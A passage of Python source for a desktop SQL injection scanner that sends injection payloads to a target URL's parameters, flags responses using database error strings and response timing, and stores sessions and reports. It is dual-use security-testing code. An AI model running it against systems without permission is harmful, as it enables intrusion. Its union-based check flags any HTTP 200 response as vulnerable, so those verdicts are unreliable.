                headers = {'User-Agent': self.settings['user_agent']}
            else:
                headers['User-Agent'] = self.settings['user_agent']
            
            timeout = int(self.settings['timeout'])
            
            if method.upper() == 'GET':
                # Inject payload into URL parameter
                test_url = f"{url}?{param_name}={payload}"
                start_time = time.time()
                response = requests.get(test_url, headers=headers, cookies=cookies, 
                                      timeout=timeout, verify=self.verify_ssl_var.get())
            else:
                # Inject payload into POST data
                data = {param_name: payload}
                start_time = time.time()
                response = requests.post(url, data=data, headers=headers, cookies=cookies,
                                       timeout=timeout, verify=self.verify_ssl_var.get())
            
            end_time = time.time()
            result['response_time'] = end_time - start_time
            result['response_length'] = len(response.content)
            
            # Analyze response for SQL injection indicators
            response_text = response.text.lower()
            
            # Error-based detection
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet database',
                'odbc drivers error', 'sqlite_exception', 'postgresql',
                'warning: mysql', 'valid mysql result', 'mysqlclient',
                'column count doesn\'t match', 'the used select statements have',
                'table doesn\'t exist', 'unknown column', 'ambiguous column name'
            ]
            
            for error in sql_errors:
                if error in response_text:
                    result['vulnerable'] = True
                    result['vulnerability_type'] = 'Error-based SQL Injection'
                    result['severity'] = 'High'
                    result['error_message'] = error
                    break
            
            # Time-based detection
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                if result['response_time'] > 4:  # Assuming 5 second delay in payload
                    result['vulnerable'] = True
                    result['vulnerability_type'] = 'Time-based Blind SQL Injection'
                    result['severity'] = 'Medium'
            
            # Union-based detection (basic)
            if 'union' in payload.lower() and response.status_code == 200:
                # Check if response differs significantly from normal
                result['vulnerable'] = True
                result['vulnerability_type'] = 'Union-based SQL Injection'
                result['severity'] = 'High'
            
        except requests.exceptions.Timeout:
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                result['vulnerable'] = True
                result['vulnerability_type'] = 'Time-based Blind SQL Injection'
                result['severity'] = 'Medium'
                result['error_message'] = 'Request timeout (possible time-based injection)'
        except Exception as e:
            result['error_message'] = str(e)
        
        return result

    def add_result_to_tree(self, result):
        """Add a vulnerability result to the results tree"""
        severity_colors = {
            'High': 'red',
            'Medium': 'orange',
            'Low': 'yellow'
        }
        
        item = self.results_tree.insert("", "end", text=result['url'],
                                      values=(result['severity'], result['vulnerability_type'], result['parameter']))
        
        # Color code by severity
        if result['severity'] in severity_colors:
            self.results_tree.set(item, 'Severity', f"⚠ {result['severity']}")

    def stop_scan(self):
        """Stop the current scan"""
        self.stop_scan_flag = True
        self.status_var.set("Stopping scan...")

    def clear_scan_results(self):
        """Clear all scan results"""
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.scan_results = []
        self.status_var.set("Results cleared")

    def show_vulnerability_details(self, event):
        """Show detailed information about a selected vulnerability"""
        selection = self.results_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        url = self.results_tree.item(item, 'text')
        values = self.results_tree.item(item, 'values')
        
        # Find the full result
        full_result = None
        for result in self.scan_results:
            if (result['url'] == url and result['severity'] == values[0].replace('⚠ ', '') 
                and result['parameter'] == values[2]):
                full_result = result
                break
        
        if full_result:
            self.show_vulnerability_detail_window(full_result)

    def show_vulnerability_detail_window(self, result):
        """Show a detailed window for a vulnerability"""
        detail_window = tk.Toplevel(self.master)
        detail_window.title(f"Vulnerability Details - {result['parameter']}")
        detail_window.geometry("600x500")
        
        # Create scrolled text for details
        details_text = scrolledtext.ScrolledText(detail_window, wrap=tk.WORD)
        details_text.pack(expand=True, fill="both", padx=10, pady=10)
        
        # Format vulnerability details
        details = f"""VULNERABILITY DETAILS
{'='*50}

URL: {result['url']}
Parameter: {result['parameter']}
Method: {result['method']}
Vulnerability Type: {result['vulnerability_type']}
Severity: {result['severity']}
Timestamp: {result['timestamp']}

PAYLOAD USED:
{result['payload']}

RESPONSE ANALYSIS:
Response Time: {result['response_time']:.2f} seconds
Response Length: {result['response_length']} bytes
Error Message: {result.get('error_message', 'None')}

REMEDIATION RECOMMENDATIONS:
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Apply the principle of least privilege for database connections
- Use stored procedures where appropriate
- Enable SQL injection detection in WAF
- Regular security testing and code reviews
"""
        
        details_text.insert(tk.END, details)
        details_text.config(state='disabled')

    # Payload Manager Methods
    def populate_payload_categories(self):
        """Populate the payload categories tree"""
        for category in self.sql_payloads.keys():
            self.payload_categories.insert("", "end", text=category)

    def on_category_select(self, event):
        """Handle category selection in payload manager"""
        selection = self.payload_categories.selection()
        if not selection:
            return
        
        category = self.payload_categories.item(selection[0], 'text')
        
        # Clear and populate payloads listbox
        self.payloads_listbox.delete(0, tk.END)
        
        if category in self.sql_payloads:
            for payload in self.sql_payloads[category]:
                self.payloads_listbox.insert(tk.END, payload)
        
        # Clear editor
        self.payload_editor.delete(1.0, tk.END)

    def add_custom_payload_dialog(self):
        """Show dialog to add custom payload"""
        dialog = tk.Toplevel(self.master)
        dialog.title("Add Custom Payload")
        dialog.geometry("400x300")
        
        ttk.Label(dialog, text="Category:").pack(pady=5)
        category_var = tk.StringVar()
        category_combo = ttk.Combobox(dialog, textvariable=category_var, 
                                     values=list(self.sql_payloads.keys()) + ["Custom"])
        category_combo.pack(fill="x", padx=10)
        
        ttk.Label(dialog, text="Payload:").pack(pady=(10, 5))
        payload_text = scrolledtext.ScrolledText(dialog, height=8)
        payload_text.pack(fill="both", expand=True, padx=10)
        
        ttk.Label(dialog, text="Description:").pack(pady=(10, 5))
        desc_entry = ttk.Entry(dialog)
        desc_entry.pack(fill="x", padx=10)
        
        def save_payload():
            category = category_var.get()
            payload = payload_text.get(1.0, tk.END).strip()
            description = desc_entry.get()
            
            if not all([category, payload]):
                messagebox.showwarning("Warning", "Please fill in category and payload.")
                return
            
            # Add to database
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO custom_payloads (category, payload, description, created_date)
                    VALUES (?, ?, ?, ?)
                ''', (category, payload, description, datetime.now().isoformat()))
                self.conn.commit()
                
                # Add to memory
                if category not in self.sql_payloads:
                    self.sql_payloads[category] = []
                self.sql_payloads[category].append(payload)
                
                # Refresh UI
                self.populate_payload_categories()
                
                messagebox.showinfo("Success", "Payload added successfully!")
                dialog.destroy()
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save payload: {str(e)}")
        
        ttk.Button(dialog, text="Save", command=save_payload).pack(pady=10)

    def save_payload_changes(self):
        """Save changes to existing payload"""
        messagebox.showinfo("Info", "Payload editing functionality would be implemented here.")

    def delete_payload(self):
        """Delete selected payload"""
        messagebox.showinfo("Info", "Payload deletion functionality would be implemented here.")

    def test_payload(self):
        """Test a specific payload"""
        payload = self.payload_editor.get(1.0, tk.END).strip()
        if not payload:
            messagebox.showwarning("Warning", "No payload to test.")
            return
        
        # Simple payload validation
        if any(keyword in payload.lower() for keyword in ['select', 'union', 'insert', 'update', 'delete', 'drop']):
            messagebox.showinfo("Payload Test", "✓ Payload contains SQL keywords")
        else:
            messagebox.showinfo("Payload Test", "? Payload may not be a valid SQL injection")

    # Session Management Methods
    def save_session_dialog(self):
        """Show dialog to save current session"""
        name = self.session_name_var.get().strip()
        if not name:
            name = f"Session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        try:
            session_data = {
                'target_url': self.url_entry.get(),
                'scan_results': self.scan_results,
                'settings': self.settings,
                'timestamp': datetime.now().isoformat()
            }
            
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO sessions (name, target_url, scan_date, vulnerabilities_found, session_data)
                VALUES (?, ?, ?, ?, ?)
            ''', (name, self.url_entry.get(), datetime.now().isoformat(), 
                  len(self.scan_results), json.dumps(session_data)))
            
            self.conn.commit()
            self.load_session_history()
            
            messagebox.showinfo("Success", f"Session '{name}' saved successfully!")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save session: {str(e)}")

    def load_session_dialog(self):
        """Show dialog to load a session"""
        self.load_session_history()

    def load_session_history(self):
        """Load and display session history"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('SELECT name, scan_date, target_url, vulnerabilities_found FROM sessions ORDER BY scan_date DESC')
            sessions = cursor.fetchall()
            
            # Clear existing items
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)
            
            # Add sessions to tree
            for session in sessions:
                self.history_tree.insert("", "end", text=session[0],
                                       values=(session[1], session[2], session[3]))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load session history: {str(e)}")

    def load_selected_session(self):
        """Load the selected session"""
        selection = self.history_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session to load.")
            return
        
        session_name = self.history_tree.item(selection[0], 'text')
        
        try:
            cursor = self.conn.cursor()
            cursor.execute('SELECT session_data FROM sessions WHERE name = ?', (session_name,))
            result = cursor.fetchone()
            
            if result:
                session_data = json.loads(result[0])
                
                # Load session data into UI
                self.url_entry.delete(0, tk.END)
                self.url_entry.insert(0, session_data.get('target_url', ''))
                
                self.scan_results = session_data.get('scan_results', [])
                
                # Update results tree
                for item in self.results_tree.get_children():
                    self.results_tree.delete(item)
                
                for result in self.scan_results:
                    self.add_result_to_tree(result)
                
                self.session_name_var.set(session_name)
                messagebox.showinfo("Success", f"Session '{session_name}' loaded successfully!")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load session: {str(e)}")

    def delete_selected_session(self):
        """Delete the selected session"""
        selection = self.history_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session to delete.")
            return
        
        session_name = self.history_tree.item(selection[0], 'text')
        
        if messagebox.askyesno("Confirm Delete", f"Are you sure you want to delete session '{session_name}'?"):
            try:
                cursor = self.conn.cursor()
                cursor.execute('DELETE FROM sessions WHERE name = ?', (session_name,))
                self.conn.commit()
                
                self.load_session_history()
                messagebox.showinfo("Success", f"Session '{session_name}' deleted successfully!")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete session: {str(e)}")

    def export_selected_session(self):
        """Export the selected session"""
        selection = self.history_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session to export.")
            return
        
        session_name = self.history_tree.item(selection[0], 'text')
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            title=f"Export Session: {session_name}"
        )
        
        if filename:
            try:
                cursor = self.conn.cursor()
                cursor.execute('SELECT session_data FROM sessions WHERE name = ?', (session_name,))
                result = cursor.fetchone()
                
                if result:
                    with open(filename, 'w') as f:
                        f.write(result[0])
                    
                    messagebox.showinfo("Success", f"Session exported to {filename}")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export session: {str(e)}")

    # Report Generator Methods
    def generate_report(self):
        """Generate a comprehensive security report"""
        if not self.scan_results:
            messagebox.showwarning("Warning", "No scan results to generate report from.")
            return
        
        report_format = self.report_format_var.get()
        
        # Get report filename
        if report_format == "PDF":
            filename = filedialog.asksaveasfilename(
                defaultextension=".pdf",
                filetypes=[("PDF files", "*.pdf")],
                title="Save Report As"
            )
        elif report_format == "HTML":
            filename = filedialog.asksaveasfilename(
                defaultextension=".html",
                filetypes=[("HTML files", "*.html")],
                title="Save Report As"
            )
        elif report_format == "CSV":
            filename = filedialog.asksaveasfilename(
                defaultextension=".csv",
                filetypes=[("CSV files", "*.csv")],
                title="Save Report As"
            )
        else:  # JSON
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json")],
                title="Save Report As"
            )
        
        if not filename:
            return
        
        try:
            if report_format == "PDF":
                self.generate_pdf_report(filename)
            elif report_format == "HTML":
                self.generate_html_report(filename)
            elif report_format == "CSV":
                self.generate_csv_report(filename)
            else:  # JSON
                self.generate_json_report(filename)
            
            messag
